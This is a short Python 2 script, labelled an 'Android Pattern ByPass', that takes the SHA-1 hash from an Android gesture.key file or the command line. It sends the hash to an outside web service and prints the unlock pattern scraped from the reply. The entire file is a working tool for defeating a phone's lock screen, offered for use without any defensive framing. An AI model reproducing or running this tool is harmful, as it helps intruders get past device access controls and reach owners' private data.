import urllib,urllib2,re
from hashlib import sha1
from sys import argv

#P-Decode 
#Android Pattern ByPass ()
#Coded by MGF15
#first you need gesture.key file you can find it on /data/system/

def get(x):
	try:
		site = "http://android.saz.lt/cgi-bin/pattern.py"

		P = urllib.urlencode({'encoded':x})

		req  = urllib2.Request(site)

		b = urllib2.urlopen(req, P)

		data = b.read()

		g = re.findall(r'<strong>(.*?)</strong>',data)

		print "\nDecoded Pattern :" , g[0]
	except:
		print 'Check Your Internet'
if len(argv) < 2:
	print 'Options::\n'
	print '\t-f [File].key'
	print '\t-p [Pattern Hash]'
	print '\tEx: \n\n\t-f gesture.key '
	print '\t-p 093736a37d9b401e5138cbcb077b4f4ecd40fe0a'
	exit()
opt = argv[1]

if opt == '-f':

	File = argv[2]

	one = open(File,'rb')

	u = one.read(sha1().digest_size).encode('hex')

	print '\nPattern Hash :: ' + u.upper() + ' ::'
	get(u)

if opt == '-p':
	u = argv[2]
	get(u)
	
n = '''
+---+---+---+
| 0 | 1 | 2 |
+---+---+---+
| 3 | 4 | 5 |
+---+---+---+
| 6 | 7 | 8 |
+---+---+---+
'''

print "\n",n
